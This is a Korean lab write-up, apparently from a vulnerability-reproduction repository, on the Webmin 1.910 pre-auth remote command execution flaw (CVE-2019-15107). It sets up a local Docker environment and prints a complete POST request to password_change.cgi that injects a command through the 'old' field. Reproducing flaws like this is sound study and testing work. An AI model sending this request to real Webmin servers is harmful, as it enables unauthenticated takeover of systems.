# Webmin Pre-Auth 원격 코드 실행 취약점 (CVE-2019-15107)

> [류석준 (@seory0)](https://github.com/seory0)

<br>

### 요약
- Webmin은 유닉스 계열 시스템을 위한 웹 기반 시스템 구성 도구
- **비인증 사용자**가 **패스워드 재설정 페이지**를 통해 단순한 POST 요청만으로 임의 명령어를 실행 가능

<br>

### 참고 자료
- <https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107>
- <https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html>
- <https://www.exploit-db.com/exploits/47230>
- <https://blog.firosolutions.com/exploits/webmin/>

<br>

### 환경 구성 및 실행
- 아래 명령어로 테스트 환경 실행
```bash
docker compose up -d
```
- `https://localhost:10000`에 접속하여 Webmin 로그인 페이지 확인(꼭 https로 접속할 것!)
- 다음과 같은 로그인 페이 확인 가능
![](/1.png)
- 다음과 같은 **POST 요청**을 보내면 `id` 명령어가 실행
```http
POST /password_change.cgi HTTP/1.1
Host: your-ip:10000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: https://your-ip:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```
<br>

### 결과

![](/2.png)

<br>

### 정리

Webmin 1.910 버전은 인증되지 않은 공격자가 임의로 코드를 실행할 수 있다. POST 요청에 조작된 `old` 파라미터를 삽입하여 시스템 명령어를 실행할 수 있다. 안전한 웹 서비스 운영을 위해 주기적인 웹 서비스 업데이트가 필요하다.
